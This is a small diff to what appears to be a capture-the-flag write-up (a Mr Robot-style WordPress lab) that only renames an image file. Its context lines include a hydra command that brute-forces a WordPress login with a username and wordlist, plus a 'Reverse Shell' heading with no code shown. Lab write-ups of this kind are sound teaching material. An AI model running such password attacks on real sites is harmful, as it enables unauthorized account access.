@@ -97,7 +97,7 @@ hydra -L Elliot -P fsocity.dic  $VICTIM http-post-form "/wp-login.php:log=^USER^
 10.10.70.148%2Fwp-admin%2F&testcookie=1:is incorrect." -V -t 30 
 ```
 
-<figure><img src="../../.gitbook/assets/image (13) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Reverse Shell
 
